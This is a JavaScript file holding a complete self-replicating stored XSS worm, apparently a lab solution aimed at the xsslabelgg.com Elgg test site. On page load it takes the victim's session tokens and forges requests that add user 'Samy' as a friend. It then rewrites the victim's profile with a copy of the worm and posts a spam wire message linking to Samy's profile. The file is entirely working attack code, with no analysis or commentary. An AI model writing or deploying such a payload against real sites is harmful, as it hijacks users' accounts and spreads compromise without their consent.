
<script id=worm>
     window.onload = function(){
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.
	if(elgg.session.user.guid!=47)
	{
		var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token+ts+token;

		//Create and send Ajax request to add friend
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
	}

	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	//var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var token="__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the content of your url.
        
	var sendurl="http://www.xsslabelgg.com/action/profile/edit";
	var content=token+ts+"&description="+wormCode+"&accesslevel%5Bdescription%5D=1&briefdescription=1605072&accesslevel%5Bbriefdescription%5D=1&location=fs_loc&accesslevel%5Blocation%5D=1&interests=fs_int&accesslevel%5Binterests%5D=1&skills=fs_ski&accesslevel%5Bskills%5D=1&contactemail=fs_con_em%40gmail.com&accesslevel%5Bcontactemail%5D=1&phone=99999&accesslevel%5Bphone%5D=1&mobile=fs_mp&accesslevel%5Bmobile%5D=1&website=https%3A%2F%2Fmoodle.cse.buet.ac.bd%2Ffs&accesslevel%5Bwebsite%5D=1&twitter=fs_twt&accesslevel%5Btwitter%5D=1&guid="+elgg.session.user.guid;
	
	//if(//Condition to check if the user is not Samy)
	if(elgg.session.user.guid!=47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}

	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="__elgg_token="+elgg.security.token.__elgg_token;

	var a = document.createElement('a'); 
	a.href = "http://www.xsslabelgg.com/profile/samy"; 

	var sendurl="http://www.xsslabelgg.com/action/thewire/add";
	var content=token+ts+"&body=To earn 12 USD/Hour(!), visit now "+a;
	
	if(elgg.session.user.guid!=47)
	{
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}

   }
</script>
